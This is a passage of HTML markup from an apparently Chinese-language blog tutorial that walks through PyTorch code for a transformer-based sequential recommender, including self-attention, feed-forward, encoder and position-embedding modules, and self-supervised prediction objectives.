class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">SelfAttention</span>(nn.Module):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, args</span>):</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(SelfAttention, self).__init__()</span><br><span class=\"line\">        <span class=\"keyword\">if</span> args.hidden_size % args.num_attention_heads != <span class=\"number\">0</span>:</span><br><span class=\"line\">            <span class=\"keyword\">raise</span> ValueError(<span class=\"string\">&quot;The hidden size is not a multiple of the number of attention heads&quot;</span>)</span><br><span class=\"line\">        self.num_attention_heads = args.num_attention_heads</span><br><span class=\"line\">        self.attention_head_size = <span class=\"built_in\">int</span>(args.hidden_size / args.num_attention_heads)</span><br><span class=\"line\">        self.all_head_size = self.num_attention_heads * self.attention_head_size</span><br><span class=\"line\">        self.query = nn.Linear(args.hidden_size, self.all_head_size)</span><br><span class=\"line\">        self.key = nn.Linear(args.hidden_size, self.all_head_size)</span><br><span class=\"line\">        self.value = nn.Linear(args.hidden_size, self.all_head_size)</span><br><span class=\"line\">        self.attn_dropout = nn.Dropout(args.attention_probs_dropout_prob)</span><br><span class=\"line\">        <span class=\"comment\"># 做完self-attention 做一个前馈全连接 LayerNorm 输出</span></span><br><span class=\"line\">        self.dense = nn.Linear(args.hidden_size, args.hidden_size)</span><br><span class=\"line\">        self.LayerNorm = LayerNorm(args.hidden_size, eps=<span class=\"number\">1e-12</span>)</span><br><span class=\"line\">        self.out_dropout = nn.Dropout(args.hidden_dropout_prob)</span><br></pre></td></tr></table></figure></p>\n<p><strong>检查 hidden_size 和 num_attention_heads</strong>:</p>\n<ul>\n<li>如果  <code>hidden_size</code>  不能被  <code>num_attention_heads</code>  整除，抛出一个错误。</li>\n</ul>\n<p><strong>定义参数</strong>:</p>\n<ul>\n<li><code>self.num_attention_heads</code> ：注意力头的数量。</li>\n<li><code>self.attention_head_size</code> ：每个注意力头的大小。</li>\n<li><code>self.all_head_size</code> ：所有注意力头的总大小，即  <code>num_attention_heads * attention_head_size</code> 。</li>\n</ul>\n<p><strong>定义线性变换层</strong>:</p>\n<ul>\n<li><code>self.query</code> ：用于生成查询向量。</li>\n<li><code>self.key</code> ：用于生成键向量。</li>\n<li><code>self.value</code> ：用于生成值向量。</li>\n</ul>\n<p><strong>定义丢弃层</strong>:</p>\n<ul>\n<li><code>self.attn_dropout</code> ：用于注意力概率的丢弃。</li>\n<li><code>self.out_dropout</code> ：用于输出的丢弃。</li>\n</ul>\n<p><strong>定义层归一化</strong>:</p>\n<ul>\n<li><code>self.LayerNorm</code> ：用于输出的层归一化。</li>\n</ul>\n<h4 id=\"转置函数\"><a class=\"anchor\" href=\"#转置函数\">#</a> 转置函数</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">transpose_for_scores</span>(<span class=\"params\">self, x</span>):</span><br><span class=\"line\">    new_x_shape = x.size()[:-<span class=\"number\">1</span>] + (self.num_attention_heads, self.attention_head_size)</span><br><span class=\"line\">    x = x.view(*new_x_shape)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x.permute(<span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">1</span>, <span class=\"number\">3</span>)</span><br></pre></td></tr></table></figure></p>\n<p><code>new_x_shape</code> ：新的形状为  <code>(batch_size, seq_length, num_attention_heads, attention_head_size)</code> 。</p>\n<p><code>x.view(*new_x_shape)</code> ：调整  <code>x</code>  的形状为新的形状。</p>\n<p><code>x.permute(0, 2, 1, 3)</code> ：调整维度顺序为  <code>(batch_size, num_attention_heads, seq_length, attention_head_size)</code> 。</p>\n<h4 id=\"前向传播函数\"><a class=\"anchor\" href=\"#前向传播函数\">#</a> 前向传播函数</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">forward</span>(<span class=\"params\">self, input_tensor, attention_mask</span>):</span><br><span class=\"line\">     mixed_query_layer = self.query(input_tensor)</span><br><span class=\"line\">     mixed_key_layer = self.key(input_tensor)</span><br><span class=\"line\">     mixed_value_layer = self.value(input_tensor)</span><br><span class=\"line\"></span><br><span class=\"line\">     query_layer = self.transpose_for_scores(mixed_query_layer)</span><br><span class=\"line\">     key_layer = self.transpose_for_scores(mixed_key_layer)</span><br><span class=\"line\">     value_layer = self.transpose_for_scores(mixed_value_layer)</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"comment\"># Take the dot product between &quot;query&quot; and &quot;key&quot; to get the raw attention scores.</span></span><br><span class=\"line\">     attention_scores = torch.matmul(query_layer, key_layer.transpose(-<span class=\"number\">1</span>, -<span class=\"number\">2</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">     attention_scores = attention_scores / math.sqrt(self.attention_head_size)</span><br><span class=\"line\">     <span class=\"comment\"># Apply the attention mask is (precomputed for all layers in BertModel forward() function)</span></span><br><span class=\"line\">     <span class=\"comment\"># [batch_size heads seq_len seq_len] scores</span></span><br><span class=\"line\">     <span class=\"comment\"># [batch_size 1 1 seq_len]</span></span><br><span class=\"line\">     attention_scores = attention_scores + attention_mask</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"comment\"># Normalize the attention scores to probabilities.</span></span><br><span class=\"line\">     attention_probs = nn.Softmax(dim=-<span class=\"number\">1</span>)(attention_scores)</span><br><span class=\"line\">     <span class=\"comment\"># This is actually dropping out entire tokens to attend to, which might</span></span><br><span class=\"line\">     <span class=\"comment\"># seem a bit unusual, but is taken from the original Transformer paper.</span></span><br><span class=\"line\">     <span class=\"comment\"># Fixme</span></span><br><span class=\"line\">     attention_probs = self.attn_dropout(attention_probs)</span><br><span class=\"line\">     context_layer = torch.matmul(attention_probs, value_layer)</span><br><span class=\"line\">     context_layer = context_layer.permute(<span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">1</span>, <span class=\"number\">3</span>).contiguous()</span><br><span class=\"line\">     new_context_layer_shape = context_layer.size()[:-<span class=\"number\">2</span>] + (self.all_head_size,)</span><br><span class=\"line\">     context_layer = context_layer.view(*new_context_layer_shape)</span><br><span class=\"line\">     hidden_states = self.dense(context_layer)</span><br><span class=\"line\">     hidden_states = self.out_dropout(hidden_states)</span><br><span class=\"line\">     hidden_states = self.LayerNorm(hidden_states + input_tensor)</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"keyword\">return</span> hidden_states</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><strong>计算查询、键和值向量</strong></li>\n<li>使用  <code>transpose_for_scores</code>  函数调整查询、键和值向量的形状。</li>\n</ul>\n<p><strong>计算注意力分数</strong>：</p>\n<ul>\n<li><code>attention_scores = torch.matmul(query_layer, key_layer.transpose(-1, -2))</code> ：计算查询和键向量的点积，得到注意力分数。</li>\n<li><code>attention_scores = attention_scores / math.sqrt(self.attention_head_size)</code> ：将注意力分数缩放，以减小数值范围。</li>\n<li><code>attention_scores = attention_scores + attention_mask</code> ：将注意力掩码添加到注意力分数中，以避免关注填充位置。</li>\n</ul>\n<p><strong>计算注意力概率</strong>：</p>\n<ul>\n<li><code>attention_probs = nn.Softmax(dim=-1)(attention_scores)</code> ：对注意力分数应用 <strong>softmax</strong> 函数，得到注意力概率。</li>\n<li><code>attention_probs = self.attn_dropout(attention_probs)</code> ：对注意力概率应用丢弃。</li>\n</ul>\n<p><strong>计算上下文层</strong>：</p>\n<ul>\n<li><code>context_layer = torch.matmul(attention_probs, value_layer)</code> ：使用注意力概率加权值向量，得到上下文层。</li>\n<li><code>context_layer = context_layer.permute(0, 2, 1, 3).contiguous()</code> ：调整上下文层的形状。</li>\n<li><code>new_context_layer_shape = context_layer.size()[:-2] + (self.all_head_size,)</code> ：计算新的上下文层形状。</li>\n<li><code>context_layer = context_layer.view(*new_context_layer_shape)</code> ：调整上下文层的形状为新的形状。</li>\n</ul>\n<p><strong>应用线性变换和丢弃</strong>：</p>\n<ul>\n<li><code>hidden_states = self.dense(context_layer)</code> ：对上下文层应用线性变换。</li>\n<li><code>hidden_states = self.out_dropout(hidden_states)</code> ：对线性变换后的结果应用丢弃。</li>\n</ul>\n<p><strong>应用层归一化</strong>：</p>\n<ul>\n<li><code>hidden_states = self.LayerNorm(hidden_states + input_tensor)</code> ：对结果应用层归一化，并添加输入张量（残差连接）。</li>\n</ul>\n<p><strong>返回结果</strong>：</p>\n<ul>\n<li>返回处理后的隐状态（hidden states）。</li>\n</ul>\n<h3 id=\"前馈神经网络fnn\"><a class=\"anchor\" href=\"#前馈神经网络fnn\">#</a> 前馈神经网络 FNN</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Intermediate</span>(nn.Module):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, args</span>):</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(Intermediate, self).__init__()</span><br><span class=\"line\">        self.dense_1 = nn.Linear(args.hidden_size, args.hidden_size * <span class=\"number\">4</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(args.hidden_act, <span class=\"built_in\">str</span>):</span><br><span class=\"line\">            self.intermediate_act_fn = ACT2FN[args.hidden_act]</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            self.intermediate_act_fn = args.hidden_act</span><br><span class=\"line\"></span><br><span class=\"line\">        self.dense_2 = nn.Linear(args.hidden_size * <span class=\"number\">4</span>, args.hidden_size)</span><br><span class=\"line\">        self.LayerNorm = LayerNorm(args.hidden_size, eps=<span class=\"number\">1e-12</span>)</span><br><span class=\"line\">        self.dropout = nn.Dropout(args.hidden_dropout_prob)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">forward</span>(<span class=\"params\">self, input_tensor</span>):</span><br><span class=\"line\"></span><br><span class=\"line\">        hidden_states = self.dense_1(input_tensor)</span><br><span class=\"line\">        hidden_states = self.intermediate_act_fn(hidden_states)</span><br><span class=\"line\"></span><br><span class=\"line\">        hidden_states = self.dense_2(hidden_states)</span><br><span class=\"line\">        hidden_states = self.dropout(hidden_states)</span><br><span class=\"line\">        hidden_states = self.LayerNorm(hidden_states + input_tensor)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> hidden_states</span><br></pre></td></tr></table></figure></p>\n<p><strong>线性变换层  <code>dense_1</code> </strong>:</p>\n<ul>\n<li><code>self.dense_1 = nn.Linear(args.hidden_size, args.hidden_size * 4)</code> ：定义第一层线性变换，将输入的维度从  <code>hidden_size</code>  扩展到  <code>hidden_size * 4</code> 。</li>\n</ul>\n<p><strong>激活函数  <code>intermediate_act_fn</code> </strong>:</p>\n<ul>\n<li><code>if isinstance(args.hidden_act, str): self.intermediate_act_fn = ACT2FN[args.hidden_act]</code> ：如果  <code>args.hidden_act</code>  是字符串，从  <code>ACT2FN</code>  字典中查找对应的激活函数。</li>\n<li><code>else: self.intermediate_act_fn = args.hidden_act</code> ：否则直接使用传入的激活函数。</li>\n</ul>\n<p><strong>线性变换层  <code>dense_2</code> </strong>:</p>\n<ul>\n<li><code>self.dense_2 = nn.Linear(args.hidden_size * 4, args.hidden_size)</code> ：定义第二层线性变换，将维度从  <code>hidden_size * 4</code>  缩小回  <code>hidden_size</code> 。</li>\n</ul>\n<p><strong>层归一化  <code>LayerNorm</code> </strong>:</p>\n<ul>\n<li><code>self.LayerNorm = LayerNorm(args.hidden_size, eps=1e-12)</code> ：定义层归一化模块，用于归一化输出。</li>\n</ul>\n<p><strong>丢弃层  <code>dropout</code> </strong>:</p>\n<ul>\n<li><code>self.dropout = nn.Dropout(args.hidden_dropout_prob)</code> ：定义丢弃层，用于防止过拟合。</li>\n</ul>\n<p><strong>第一层线性变换</strong>：</p>\n<ul>\n<li><code>hidden_states = self.dense_1(input_tensor)</code> ：将输入  <code>input_tensor</code>  通过第一层线性变换，得到  <code>hidden_states</code> ，维度从  <code>hidden_size</code>  扩展到  <code>hidden_size * 4</code> 。</li>\n</ul>\n<p><strong>激活函数</strong>：</p>\n<ul>\n<li><code>hidden_states = self.intermediate_act_fn(hidden_states)</code> ：对  <code>hidden_states</code>  应用激活函数，增加非线性。</li>\n</ul>\n<p><strong>第二层线性变换</strong>：</p>\n<ul>\n<li><code>hidden_states = self.dense_2(hidden_states)</code> ：将  <code>hidden_states</code>  通过第二层线性变换，维度从  <code>hidden_size * 4</code>  缩小回  <code>hidden_size</code> 。</li>\n</ul>\n<p><strong>丢弃层</strong>：</p>\n<ul>\n<li><code>hidden_states = self.dropout(hidden_states)</code> ：对  <code>hidden_states</code>  应用丢弃层，防止过拟合。</li>\n</ul>\n<p><strong>层归一化</strong>：</p>\n<ul>\n<li><code>hidden_states = self.LayerNorm(hidden_states + input_tensor)</code> ：将归一化后的  <code>hidden_states</code>  与输入  <code>input_tensor</code>  相加（残差连接），并进行层归一化。</li>\n</ul>\n<p><strong>返回结果</strong>：</p>\n<ul>\n<li>返回处理后的  <code>hidden_states</code> 。</li>\n</ul>\n<h3 id=\"layer-类\"><a class=\"anchor\" href=\"#layer-类\">#</a> Layer 类</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Layer</span>(nn.Module):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, args</span>):</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(Layer, self).__init__()</span><br><span class=\"line\">        self.attention = SelfAttention(args)</span><br><span class=\"line\">        self.intermediate = Intermediate(args)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">forward</span>(<span class=\"params\">self, hidden_states, attention_mask</span>):</span><br><span class=\"line\">        attention_output = self.attention(hidden_states, attention_mask)</span><br><span class=\"line\">        intermediate_output = self.intermediate(attention_output)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> intermediate_output</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>初始化自注意模块和前馈神经网络</li>\n<li>注意力输出  <code>attention_output</code>  传递给前馈神经网络模块  <code>self.intermediate</code> 。</li>\n<li>前馈神经网络模块进一步处理注意力输出，得到中间输出  <code>intermediate_output</code> 。</li>\n</ul>\n<h3 id=\"编码层transformer\"><a class=\"anchor\" href=\"#编码层transformer\">#</a> 编码层（Transformer）</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Encoder</span>(nn.Module):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, args</span>):</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(Encoder, self).__init__()</span><br><span class=\"line\">        layer = Layer(args)</span><br><span class=\"line\">        self.layer = nn.ModuleList([copy.deepcopy(layer)</span><br><span class=\"line\">                                    <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(args.num_hidden_layers)])</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">forward</span>(<span class=\"params\">self, hidden_states, attention_mask, output_all_encoded_layers=<span class=\"literal\">True</span></span>):</span><br><span class=\"line\">        all_encoder_layers = []</span><br><span class=\"line\">        <span class=\"keyword\">for</span> layer_module <span class=\"keyword\">in</span> self.layer:</span><br><span class=\"line\">            hidden_states = layer_module(hidden_states, attention_mask)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> output_all_encoded_layers:</span><br><span class=\"line\">                all_encoder_layers.append(hidden_states)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> output_all_encoded_layers:</span><br><span class=\"line\">            all_encoder_layers.append(hidden_states)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> all_encoder_layers</span><br></pre></td></tr></table></figure></p>\n<p><strong>创建单层  <code>Layer</code>  实例</strong>：</p>\n<ul>\n<li><code>layer = Layer(args)</code> ：创建一个  <code>Layer</code>  实例， <code>Layer</code>  类在前面已经定义过，包含自注意力和前馈神经网络模块。</li>\n</ul>\n<p><strong>堆叠多层  <code>Layer</code>  实例</strong>：</p>\n<ul>\n<li>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>self<span class=\"token punctuation\">.</span>layer <span class=\"token operator\">=</span> nn<span class=\"token punctuation\">.</span>ModuleList<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>copy<span class=\"token punctuation\">.</span>deepcopy<span class=\"token punctuation\">(</span>layer<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">.</span>num_hidden_layers<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">&lt;</span>!<span class=\"token operator\">-</span><span class=\"token operator\">-</span>code￼<span class=\"token number\">14</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span></pre></td></tr></table></figure></li>\n</ul>\n<ul>\n<li>初始化模型，包括嵌入层（物品嵌入、属性嵌入、位置嵌入）、编码器、层归一化和 Dropout。</li>\n<li>初始化用于不同损失计算的全连接层和损失函数（BCELoss）。</li>\n</ul>\n<h3 id=\"添加位置嵌入\"><a class=\"anchor\" href=\"#添加位置嵌入\">#</a> 添加位置嵌入</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add_position_embedding</span>(<span class=\"params\">self, sequence</span>):</span><br><span class=\"line\">    seq_length = sequence.size(<span class=\"number\">1</span>)</span><br><span class=\"line\">    position_ids = torch.arange(seq_length, dtype=torch.long, device=sequence.device)</span><br><span class=\"line\">    position_ids = position_ids.unsqueeze(<span class=\"number\">0</span>).expand_as(sequence)</span><br><span class=\"line\">    item_embeddings = self.item_embeddings(sequence)</span><br><span class=\"line\">    position_embeddings = self.position_embeddings(position_ids)</span><br><span class=\"line\">    sequence_emb = item_embeddings + position_embeddings</span><br><span class=\"line\">    sequence_emb = self.LayerNorm(sequence_emb)</span><br><span class=\"line\">    sequence_emb = self.dropout(sequence_emb)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> sequence_emb</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>计算位置嵌入并与物品嵌入相加，随后进行层归一化和 Dropout。</li>\n<li>先获取输入序列的长度</li>\n<li><code>torch.arange(seq_length, dtype=torch.long, device=sequence.device)</code> ：生成一个从  <code>0</code>  到  <code>seq_length-1</code>  的位置 ID 张量，数据类型为  <code>long</code> ，并且与输入序列的设备相同（CPU 或 GPU）。</li>\n<li><code>position_ids.unsqueeze(0)</code> ：在第一个维度上增加一个维度，使其形状变为  <code>(1, seq_length)</code> 。</li>\n<li><code>position_ids.expand_as(sequence)</code> ：将位置 ID 张量扩展为与输入序列形状相同的张量  <code>(batch_size, seq_length)</code> 。</li>\n<li><strong>获取项目嵌入</strong>： <code>self.item_embeddings(sequence)</code> ：使用项目嵌入层将输入序列中的项目 ID 映射到嵌入向量，得到的  <code>item_embeddings</code>  形状为  <code>(batch_size, seq_length, hidden_size)</code> 。</li>\n<li><strong>获取位置嵌入</strong>： <code>self.position_embeddings(position_ids)</code> ：使用位置嵌入层将位置 ID 映射到嵌入向量，得到的  <code>position_embeddings</code>  形状为  <code>(batch_size, seq_length, hidden_size)</code> 。</li>\n<li>将项目嵌入和位置嵌入相加，得到最终的序列嵌入  <code>sequence_emb</code> ，形状为  <code>(batch_size, seq_length, hidden_size)</code> 。</li>\n<li>使用层归一化模块对序列嵌入进行归一化，保证每个样本的特征分布稳定。</li>\n<li>使用丢弃层对归一化后的序列嵌入进行随机丢弃，以防止过拟合。</li>\n<li>返回处理后的序列嵌入  <code>sequence_emb</code> 。</li>\n</ul>\n<h3 id=\"自监督学习目标-2\"><a class=\"anchor\" href=\"#自监督学习目标-2\">#</a> 自监督学习目标</h3>\n<h4 id=\"aap-associated-attribute-prediction-预测与物品相关的属性\"><a class=\"anchor\" href=\"#aap-associated-attribute-prediction-预测与物品相关的属性\">#</a> AAP (Associated Attribute Prediction) 预测与物品相关的属性</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">associated_attribute_prediction</span>(<span class=\"params\">self, sequence_output, attribute_embedding</span>):</span><br><span class=\"line\">    sequence_output = self.aap_norm(sequence_output)</span><br><span class=\"line\">    sequence_output = sequence_output.view([-<span class=\"number\">1</span>, self.args.hidden_size, <span class=\"number\">1</span>])</span><br><span class=\"line\">    score = torch.matmul(attribute_embedding, sequence_output)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> torch.sigmoid(score.squeeze(-<span class=\"number\">1</span>))</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>归一化序列输出</li>\n<li>使用  <code>view</code>  方法调整  <code>sequence_output</code>  的形状，使其变为三维张量，形状为  <code>[batch_size * seq_length, hidden_size, 1]</code> 。</li>\n<li><code>score = torch.matmul(attribute_embedding, sequence_output)</code>  使用矩阵乘法  <code>torch.matmul</code>  计算  <code>attribute_embedding</code>  和  <code>sequence_output</code>  之间的乘积。</li>\n<li>使用  <code>squeeze(-1)</code>  移除最后一个维度，将  <code>score</code>  的形状从  <code>[batch_size * seq_length, num_attributes, 1]</code>  变为  <code>[batch_size * seq_length, num_attributes]</code> 。</li>\n<li>使用 torch.sigmoid 函数将得分转换为概率，返回最终的预测结果。</li>\n</ul>\n<h4 id=\"mip-masked-item-prediction-预测被掩码的物品\"><a class=\"anchor\" href=\"#mip-masked-item-prediction-预测被掩码的物品\">#</a> MIP (Masked Item Prediction) 预测被掩码的物品</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">masked_item_prediction</span>(<span class=\"params\">self, sequence_output, target_item</span>):</span><br><span class=\"line\">    sequence_output = self.mip_norm(sequence_output.view([-<span class=\"number\">1</span>, self.args.hidden_size]))</span><br><span class=\"line\">    target_item = target_item.view([-<span class=\"number\">1</span>, self.args.hidden_size])</span><br><span class=\"line\">    score = torch.mul(sequence_output, target_item)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> torch.sigmoid(torch.<span class=\"built_in\">sum</span>(score, -<span class=\"number\">1</span>))</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>归一化</li>\n<li>使用  <code>view</code>  方法将  <code>target_item</code>  的形状调整为  <code>[batch_size * seq_length, hidden_size]</code> ，与  <code>sequence_output</code>  的形状匹配。</li>\n<li>使用  <code>torch.mul</code>  进行逐元素相乘，计算  <code>sequence_output</code>  和  <code>target_item</code>  之间的点乘，得到  <code>score</code> ，形状为  <code>[batch_size * seq_length, hidden_size]</code> 。</li>\n<li><code>torch.sum(score, -1)</code>  对  <code>score</code>  的最后一个维度（即  <code>hidden_size</code>  维度）求和，得到形状为  <code>[batch_size * seq_length]</code>  的张量。</li>\n<li>使用 torch.sigmoid 函数将求和结果转换为概率，返回最终的预测结果。</li>\n</ul>\n<h4 id=\"sp-segment-prediction-预测被掩码的段落\"><a class=\"anchor\" href=\"#sp-segment-prediction-预测被掩码的段落\">#</a> SP (Segment Prediction) 预测被掩码的段落。</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">segment_prediction</span>(<span class=\"params\">self, context, segment</span>):</span><br><span class=\"line\">    context = self.sp_norm(context)</span><br><span class=\"line\">    score = torch.mul(context, segment)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> torch.sigmoid(torch.<span class=\"built_in\">sum</span>(score, dim=-<span class=\"number\">1</span>))</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>归一化</li>\n<li>使用  <code>torch.mul</code>  进行逐元素相乘，计算  <code>context</code>  和  <code>segment</code>  之间的点乘，得到  <code>score</code> 。</li>\n<li><code>context</code>  和  <code>segment</code>  的形状通常为  <code>[batch_size, hidden_size]</code> ，点乘结果  <code>score</code>  的形状也为  <code>[batch_size, hidden_size]</code> 。</li>\n<li><code>torch.sum(score, dim=-1)</code>  对  <code>score</code>  的最后一个维度（即  <code>hidden_size</code>  维度）求和，得到形状为  <code>[batch_size]</code>  的张量。</li>\n<li>使用  <code>torch.sigmoid</code>  函数将求和结果转换为概率，返回最终的预测结果。</li>\n</ul>\n<h3 id=\"预训练\"><a class=\"anchor\" href=\"#预训练\">#</a> 预训练</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span 